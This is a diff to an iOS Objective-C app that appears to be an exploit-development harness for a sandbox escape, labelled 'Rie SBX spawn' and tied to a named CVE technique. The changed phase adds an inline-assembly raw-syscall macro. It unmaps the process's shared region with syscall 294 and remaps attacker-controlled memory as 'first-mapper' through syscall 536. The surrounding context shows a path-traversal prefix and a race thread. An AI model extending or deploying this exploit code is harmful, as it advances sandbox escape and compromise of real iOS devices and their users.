@@ -943,7 +943,7 @@ static void *e2_free_and_ool_racer(void *arg) {
     UIButtonConfiguration *rieConf = [UIButtonConfiguration filledButtonConfiguration];
     rieConf.baseBackgroundColor = [UIColor systemPinkColor];
     self.rieProbeButton.configuration = rieConf;
-    [self.rieProbeButton setTitle:@"Rie SBX spawn (v238)" forState:UIControlStateNormal];
+    [self.rieProbeButton setTitle:@"Rie SBX spawn (v239)" forState:UIControlStateNormal];
     [self.rieProbeButton addTarget:self action:@selector(rieProbeTapped) forControlEvents:UIControlEventTouchUpInside];
     [self.view addSubview:self.rieProbeButton];
 
@@ -9166,7 +9166,7 @@ static uint64_t rie_find_exec_base(task_t task,
 
 - (void)rieProbeTapped {
     dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
-        [self appendLog:@"\n=== Rie v238: dealloc safe text pages + signal guard + re-map ===\n"];
+        [self appendLog:@"\n=== Rie v239: unmap SR via raw SVC(294,0) + remap(536) as first-mapper ===\n"];
         NSString *traversalPrefix = @"../../../../../../../../../../../../../";
 
         // ── Phase S: sandbox escape probe (CVE-2026-28995 technique) ──
@@ -9708,68 +9708,84 @@ static uint64_t rie_find_exec_base(task_t task,
             }
         }
 
-        // ── Phase D-5: dealloc + re-map at known-safe address (v234: kr=0 at 0x180100000) ──
-        [self appendLog:@"\n── Phase D-5: dealloc SR pages (text, known-safe addr) + re-map ──"];
+        // ── Phase D-5: syscall(294,0) unmap SR → 536 remap as first-mapper ──
+        // HIGH RISK: unmapping SR removes all system libraries. Must use
+        // raw inline asm SVC (NOT libsystem syscall()) to survive the gap.
+        [self appendLog:@"\n── Phase D-5: unmap SR (294,0) + remap (536) raw SVC ──"];
+        [self appendLog:@"  !! HIGH RISK: process may crash if remap fails !!"];
         {
-            kern_return_t (*vm_dealloc)(vm_map_t, mach_vm_address_t, mach_vm_size_t) =
-                dlsym(RTLD_DEFAULT, "mach_vm_deallocate");
-            if (vm_dealloc) {
-                // Test A1: dealloc 1 page at 0x180100000 (worked kr=0 in v234)
-                errno = 0;
-                mach_vm_address_t tA = 0x180100000ULL;
-                kern_return_t kr1 = vm_dealloc(mach_task_self(), tA, 0x4000);
-                [self appendLog:[NSString stringWithFormat:
-                    @"  A1: dealloc 1p at 0x%llx → kr=%d", tA, kr1]];
+            // Raw SVC wrapper — compiled into our binary, survives SR unmap.
+            // XNU arm64: carry clear = success (x0=retval), carry set = error (x0=-1, x1=errno)
+            // Use %= for unique local labels across multiple macro invocations.
+            #define RIE_RAW_SVC(nr, a0,a1,a2,a3,a4,a5) ({ \
+                register long _x16 asm("x16") = (nr); \
+                register long _x0 asm("x0") = (long)(a0); \
+                register long _x1 asm("x1") = (long)(a1); \
+                register long _x2 asm("x2") = (long)(a2); \
+                register long _x3 asm("x3") = (long)(a3); \
+                register long _x4 asm("x4") = (long)(a4); \
+                register long _x5 asm("x5") = (long)(a5); \
+                asm volatile( \
+                    "svc #0x80\n\t" \
+                    : "+r"(_x0), "+r"(_x1), "+r"(_x2), "+r"(_x3), "+r"(_x4), "+r"(_x5) \
+                    : "r"(_x16) \
+                    : "cc", "memory", "x9","x10","x11","x12","x13","x14","x15","x17" \
+                ); \
+                /* On XNU arm64, Unix syscalls: x0=0 on success, x0>0=errno on error */ \
+                (long)_x0; \
+            })
 
-                // Test A2: dealloc 4 pages at next range
-                kern_return_t kr2 = 0;
-                if (kr1 == KERN_SUCCESS) {
-                    errno = 0;
-                    mach_vm_address_t tB = 0x180104000ULL;
-                    kr2 = vm_dealloc(mach_task_self(), tB, 0x10000);
-                    [self appendLog:[NSString stringWithFormat:
-                        @"  A2: dealloc 4p at 0x%llx → kr=%d", tB, kr2]];
-                }
+            // Pre-allocate source page and prepare structs BEFORE unmapping
+            uint8_t *src = NULL;
+            vm_size_t srcSz = 0x4000;
+            vm_allocate(mach_task_self(), (vm_address_t*)&src, srcSz, VM_FLAGS_ANYWHERE);
 
-                // Test B/C: try re-map if any dealloc succeeded
-                if (kr1 == KERN_SUCCESS || kr2 == KERN_SUCCESS) {
-                    mach_vm_address_t useAddr = (kr1 == KERN_SUCCESS) ? tA : 0x180104000ULL;
-                    uint64_t newAddr = 0;
-                    errno = 0;
-                    long r294 = sc(294, &newAddr);
-                    [self appendLog:[NSString stringWithFormat:
-                        @"  B: syscall 294 after dealloc → ret=%ld addr=0x%llx errno=%d",
-                        r294, (unsigned long long)newAddr, errno]];
+            struct rie_sr_file tf5;
+            struct rie_sr_mapping tm5;
+            memset(&tf5, 0, sizeof(tf5)); memset(&tm5, 0, sizeof(tm5));
+            tf5.sf_fd = -1; tf5.sf_mappings_count = 1; tf5.sf_slide = 0;
 
-                    struct rie_sr_file tf5;
-                    struct rie_sr_mapping tm5;
-                    memset(&tf5, 0, sizeof(tf5)); memset(&tm5, 0, sizeof(tm5));
-                    tf5.sf_fd = -1; tf5.sf_mappings_count = 1; tf5.sf_slide = 0;
-
-                    uint8_t *src = NULL;
-                    vm_size_t srcSz = 0x4000;
-                    vm_allocate(mach_task_self(), (vm_address_t*)&src, srcSz, VM_FLAGS_ANYWHERE);
-                    if (src) {
-                        memset(src, 0, srcSz);
-                        tm5.sms_address = useAddr;
-                        tm5.sms_size = 0x4000;
-                        tm5.sms_max_prot = 5; tm5.sms_init_prot = 3;
-                        tm5.sms_file_offset = (uint64_t)(uintptr_t)src;
-                        tm5.sms_slide_size = 0; tm5.sms_slide_start = 0;
-                        errno = 0;
-                        long rC = sc(536, 1, &tf5, 1, &tm5);
-                        [self appendLog:[NSString stringWithFormat:
-                            @"  C: re-map dealloc page fd=-1 → ret=%ld errno=%d", rC, errno]];
-                        errno = 0;
-                        long rD = sc(536, 0, NULL, 1, &tm5);
-                        [self appendLog:[NSString stringWithFormat:
-                            @"  D: re-map nf=0 nm=1 → ret=%ld errno=%d", rD, errno]];
-                        vm_deallocate(mach_task_self(), (vm_address_t)src, srcSz);
-                    }
-                }
-            } else {
-                [self appendLog:[NSString stringWithFormat:@"  dealloc=%p (not found)", vm_dealloc]];
+            if (src) {
+                memset(src, 0x41, srcSz);
+                tm5.sms_address = 0x180100000ULL;
+                tm5.sms_size = 0x4000;
+                tm5.sms_max_prot = 5; tm5.sms_init_prot = 3;
+                tm5.sms_file_offset = (uint64_t)(uintptr_t)src;
+                tm5.sms_slide_size = 0; tm5.sms_slide_start = 0;
             }
+
+            [self appendLog:[NSString stringWithFormat:
+                @"  ready: src=%p", src]];
+
+            // Step 1: unmap shared region via RIE_RAW_SVC(294, 0)
+            // Kernel: start_address==0 → unmaps SR from our task
+            long r1 = RIE_RAW_SVC(294, 0ULL, 0,0,0,0,0);
+
+            // CRITICAL: after step 1, SR is potentially unmapped!
+            // We must NOT call any ObjC or libc functions between here and step 2.
+
+            // Step 2: remap via RIE_RAW_SVC(536, nf, files_ptr, nm, maps_ptr)
+            long r2 = RIE_RAW_SVC(536, 1, (long)&tf5, 1, (long)&tm5, 0, 0);
+
+            // Now try to log results. If step 2 succeeded, SR is back and
+            // ObjC/logging works again. If not, this log line itself may crash.
+            // Raw SVC returns 0 on success, >0 as errno on error
+            [self appendLog:[NSString stringWithFormat:
+                @"  raw unmap: x0=%ld (0=ok, >0=errno) | raw remap: x0=%ld", r1, r2]];
+
+            if (r1 == 0 && r2 == 0) {
+                [self appendLog:@"  *** FIRST-MAPPER SUCCESS via raw SVC! SR remapped! ***"];
+            } else if (r1 != 0) {
+                [self appendLog:[NSString stringWithFormat:
+                    @"  unmap returned errno=%ld — sc(294,0) did not remove SR", r1]];
+            } else {
+                [self appendLog:[NSString stringWithFormat:
+                    @"  remap returned errno=%ld — unmapped but remap failed", r2]];
+            }
+
+            #undef RIE_RAW_SVC
+
+            if (src) vm_deallocate(mach_task_self(), (vm_address_t)src, srcSz);
         }
 
         // ── Phase E: Walk SR submap regions, find non-auth slide carrier ──
